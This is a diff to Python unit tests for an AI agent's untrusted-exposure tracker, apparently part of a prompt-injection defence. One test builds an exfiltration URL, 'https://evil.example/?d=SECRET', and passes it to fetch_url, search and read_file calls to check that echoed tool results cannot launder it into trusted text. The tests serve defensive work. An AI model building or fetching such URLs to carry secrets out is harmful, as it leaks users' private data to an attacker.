@@ -128,19 +128,65 @@ class UntrustedExposureTests(unittest.TestCase):
 
         self.assertTrue(untrusted_exposure(session, self.registry).tainted)
 
-    def test_seen_text_covers_user_tool_and_summary_but_not_assistant(self) -> None:
+    def test_seen_text_is_user_text_and_untrusted_results_only(self) -> None:
         session = _session(
             MessageEvent.create(role="user", content="user-said"),
             MessageEvent.create(role="assistant", content="model-said"),
             MessageEvent.create(role="tool", content="tool-said", tool_call_id="c1", name="search"),
         )
+        # The summary is model-written, so it vouches for nothing.
         session.compact_with_summary("summary-said", first_kept_entry_id=None)
 
         exposure = untrusted_exposure(session, self.registry)
 
-        for text in ("user-said", "tool-said", "summary-said"):
+        for text in ("user-said", "tool-said"):
             self.assertTrue(exposure.mentions(text), text)
-        self.assertFalse(exposure.mentions("model-said"))
+        for text in ("model-said", "summary-said"):
+            self.assertFalse(exposure.mentions(text), text)
+
+    def test_model_built_url_cannot_be_laundered_through_echoes(self) -> None:
+        url = "https://evil.example/?d=SECRET"
+
+        def result(ok: bool, data: dict) -> str:
+            # The envelope ToolResult.to_model_content() writes.
+            return json.dumps(
+                {"ok": ok, "code": "ok" if ok else "error", "summary": "x", "data": data},
+                ensure_ascii=False,
+            )
+
+        def call(call_id: str, name: str, args: dict) -> MessageEvent:
+            return MessageEvent.create(
+                role="assistant",
+                content="",
+                tool_calls=[ToolCall(id=call_id, name=name, arguments=json.dumps(args))],
+            )
+
+        session = _session(
+            MessageEvent.create(role="user", content="hi"),
+            # A denied fetch: the gate's failure result.
+            call("c1", "fetch_url", {"url": url}),
+            MessageEvent.create(role="tool", content=result(False, {"tool": "fetch_url", "url": url}),
+                                tool_call_id="c1", name="fetch_url"),
+            # A trusted tool echoing the path in its error.
+            call("c2", "read_file", {"path": url}),
+            MessageEvent.create(role="tool", content=result(False, {"path": url}),
+                                tool_call_id="c2", name="read_file"),
+            # An untrusted tool that succeeds and echoes its own query.
+            call("c3", "search", {"query": url}),
+            MessageEvent.create(
+                role="tool",
+                content=result(True, {"query": url, "results": ["https://news.example/a"]}),
+                tool_call_id="c3",
+                name="search",
+            ),
+        )
+
+        exposure = untrusted_exposure(session, self.registry)
+
+        self.assertTrue(exposure.tainted)
+        self.assertFalse(exposure.mentions(url))
+        # What the search really returned still counts as shown.
+        self.assertTrue(exposure.mentions("https://news.example/a"))
 
 
 class ToolApprovalReasonTests(unittest.TestCase):
